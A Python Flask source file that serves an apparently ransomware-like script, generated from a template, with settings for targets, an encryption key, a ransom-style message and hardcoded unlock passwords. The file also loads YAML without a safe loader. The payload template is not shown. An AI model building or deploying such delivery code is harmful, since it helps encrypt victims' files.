from flask import render_template, request, Response
import jinja2
import yaml
import json
import os
from hashlib import sha1
from . import app
from .parser.parser import parse

def render(tpl_path, **context):
    path, filename = os.path.split(tpl_path)
    return jinja2.Environment(
        loader=jinja2.FileSystemLoader(path or './')
        ).get_template(filename).render(**context)


def buildScript(server, config="config.yml"):
    '''
    Render the template with all of the corrcet values
    '''
    # Read the config file
    with open(config) as inf:
        config = yaml.load(inf)
    # Load all the default values into the config
    defaults = [('password', 'dragon'), ('public_key', ''), ('server', server),
                ('targets', ()), ('message', ''), ('encrypt', True)]
    for i in defaults:
        config[i[0]] = config.get(i[0], i[1])

    # Create the hash for the password
    shahash = sha1(config.get('password').encode()).hexdigest()
    config['hash'] = shahash

    # Load the public key
    pubkey = config.get('public_key')
    if pubkey != "":
        try:
            with open(pubkey) as inf:
                config['publickey'] = inf.read()
        except Exception as E:
            config['publickey'] = ""
    # print(json.dumps(config, indent=2))
    return parse(render("shy/templates/shy.j2", **config), comments=False,
                 retab=True)

@app.route("/shy")
def shy_deply():
    server = request.headers.get('Host', '')
    return Response(buildScript(server), mimetype='text/plain')

@app.route("/shy/decrypt")
def shy_decrypt():
    data = {}
    data['password'] = "unlockme"
    data['files'] = ["file.txt", "/home/"]
    return render_template("shy_decrypt.j2", data=data)
